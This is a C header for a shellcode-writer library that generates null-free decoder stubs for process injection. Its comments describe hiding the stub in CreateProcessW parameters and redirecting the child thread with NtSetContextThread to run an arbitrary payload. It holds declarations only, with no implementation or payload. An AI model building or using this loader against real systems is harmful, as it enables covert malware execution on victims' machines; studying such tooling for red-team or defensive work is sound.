/* ════════════════════════════════════════════════════════════════════
 * shellwriter.h — C port of p3-loader's ShellCodeWriter.cpp
 *
 * PURPOSE
 * ───────
 * ShellCodeWriter runs inside the INJECTOR process.
 * It takes an arbitrary shellcode blob (which may contain null bytes)
 * and writes a NULL-FREE DECODER STUB to a caller-supplied buffer.
 * That stub, when placed in a CreateProcessW parameter (lpReserved /
 * lpCommandLine / lpEnvironment) and executed via NtSetContextThread,
 * will: allocate RW memory, copy + decode the original payload,
 * flip the region to RX, and jump to it.
 *
 * FLOW (from the README)
 * ──────────────────────
 *  runner.exe
 *    └─► Crystal Palace PICO  (compiled from this library)
 *          └─► scw_load_and_call(w, valloc, vprot, payload, len)
 *                └─► w->buf[0..w->len-1]  = null-free P³ shellcode
 *          └─► CreateProcessW(lpReserved = w->buf)
 *          └─► locate shellcode in child PEB
 *          └─► NtProtectVirtualMemory  (RW→RX on param region)
 *          └─► NtSetContextThread      (RIP = shellcode)
 *
 * Crystal Palace PIC constraints honoured
 * ────────────────────────────────────────
 *  • No switch statements (no jump tables)
 *  • No global variables
 *  • No CRT / stdlib
 *  • No string literals in .rdata (all constants in local arrays)
 *  • Caller provides the output buffer — no heap allocation
 *
 * API addresses (VirtualAlloc, VirtualProtect, LoadLibraryA …)
 * ─────────────────────────────────────────────────────────────
 * Resolved by the Crystal Palace PICO via DFR (MODULE$Function) and
 * passed as parameters.  Because kernel32.dll is mapped at the same
 * base in every process (shared ASLR), injector-side addresses are
 * valid in the target process — exactly as in p3-loader.
 * ════════════════════════════════════════════════════════════════════ */

#ifndef SHELLWRITER_H
#define SHELLWRITER_H

typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned int       u32;
typedef unsigned long long u64;

/* Recommended output buffer sizes */
#define SCW_BUF_SMALL   1024   /* single API call (LoadLibraryA, etc.)  */
#define SCW_BUF_MEDIUM  4096   /* LoadAndCallShellCode with small SC     */
#define SCW_BUF_LARGE   16384  /* LoadAndCallShellCode with large SC     */

/* ── Context ────────────────────────────────────────────────────────
 * Mirrors m_total_consumed_stack_bytes + the output vector in
 * ShellCodeWriter.cpp.  Caller provides buf/cap; no heap.
 *
 * stack_bytes: tracks how many bytes have been sub'd from RSP at
 *   runtime since shellcode entry (assumed 16-byte aligned at start).
 *   Used to decide if 8-byte alignment padding is needed before CALL.
 * ────────────────────────────────────────────────────────────────── */
typedef struct {
    u8  *buf;          /* output buffer (caller-provided)               */
    int  len;          /* bytes written so far                           */
    int  cap;          /* buffer capacity                                */
    int  stack_bytes;  /* runtime RSP consumption since shellcode entry  */
} SCW;

/* ── Lifecycle ──────────────────────────────────────────────────────*/
void scw_init(SCW *w, u8 *buf, int cap);

/* Returns the offset of the first null byte, or -1 if clean.        */
int  scw_check_nulls(const SCW *w);

/* Append raw bytes (use for custom gadgets not exposed here).        */
void scw_append(SCW *w, const u8 *b, int n);

/* ── Primitives (= lower-level helpers from ShellCodeWriter.cpp) ────
 *
 *  scw_set_rax     = SetRAX / SetRAXXOR
 *  scw_push_value  = PushValue
 *  scw_push_buffer = PushBuffer
 *  scw_set_arg     = SetArgRegister
 *  scw_set_arg_sp  = SetArgRegisterStackRelative
 *  scw_call        = Call
 *
 * ────────────────────────────────────────────────────────────────── */

/* Null-free rax = value.
 *   value==0  →  xor rax,rax           (3 bytes)
 *   else      →  mov rax,XA; mov r15,XB; xor rax,r15  (23 bytes)
 * XA = value^XB, XB = 0x0101…01 (byte adjusted if value has 0x01).
 * Neither XA nor XB ever contains 0x00.                             */
void scw_set_rax(SCW *w, u64 value);

/* push rax after set_rax(value).  stack_bytes += 8.                 */
void scw_push_value(SCW *w, u64 value);

/* Push `len` bytes from data so rsp → data[0] after all pushes.
 * Pads to multiple of 8; each 8-byte chunk encoded null-free.
 * stack_bytes += ROUNDUP8(len).                                      */
void scw_push_buffer(SCW *w, const u8 *data, int len);

/* arg_reg = value  (0=RCX 1=RDX 2=R8 3=R9, null-free).             */
void scw_set_arg(SCW *w, int reg, u64 value);

/* arg_reg = RSP + offset.  Call BEFORE scw_call.
 * Emits: set_rax(offset); add rax,rsp; mov reg,rax                  */
void scw_set_arg_sp(SCW *w, int reg, int offset);

/* Null-free call to addr.  Conditionally adds sub rsp,8 to align to
 * 16 bytes.  The alignment bytes are PERMANENTLY consumed (stack_bytes
 * stays increased if alignment was needed) — identical to p3-loader. */
void scw_call(SCW *w, u64 addr);

/* ── High-level emitters (= public methods of ShellCodeWriter.cpp) ──
 *
 *  scw_load_and_call  = LoadAndCallShellCode   ← PRIMARY FUNCTION
 *  scw_call_loadlib   = CallLoadLibraryA
 *  scw_call_msgbox    = CallMessageBoxA
 *  scw_call_terminate = CallTerminateProcess
 *
 * ────────────────────────────────────────────────────────────────── */

/* ─── PRIMARY FUNCTION ──────────────────────────────────────────────
 * scw_load_and_call: encode an arbitrary shellcode blob (which may
 * contain null bytes) into a null-free stub.
 *
 * Generated stub execution (in target process):
 *   1. push sc[0..sc_len-1] onto stack  (null-free XOR-encoded push)
 *   2. VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE)
 *   3. copy shellcode from stack → allocation (byte loop)
 *   4. VirtualProtect(alloc, sc_len, PAGE_EXECUTE_READ, stack_ptr)
 *   5. align stack (if needed)
 *   6. jmp r12  →  execute decoded shellcode
 *
 * API addresses are resolved injector-side (same base in all procs):
 *   virtual_alloc    = address of VirtualAlloc   in KERNEL32
 *   virtual_protect  = address of VirtualProtect in KERNEL32
 * ────────────────────────────────────────────────────────────────── */
void scw_load_and_call(SCW *w,
                       u64 virtual_alloc,
                       u64 virtual_protect,
                       const u8 *sc, int sc_len);

/* LoadLibraryA(dll_name).
 * dll_name: ASCII path string; null terminator is pushed null-free.  */
void scw_call_loadlib(SCW *w, u64 loadlibrary_a, const char *dll_name);

/* MessageBoxA(NULL, text, caption, type).
 * type: 0x40 = MB_ICONINFORMATION.                                   */
void scw_call_msgbox(SCW *w, u64 messagebox_a,
                     const char *text, const char *caption, u32 type);

/* NtTerminateProcess(handle, exit_status).
 * Typical: handle=0xFFFFFFFFFFFFFFFF (NtCurrentProcess). No return.  */
void scw_call_terminate(SCW *w, u64 nt_terminate,
                        u64 handle, u32 exit_status);

#endif /* SHELLWRITER_H */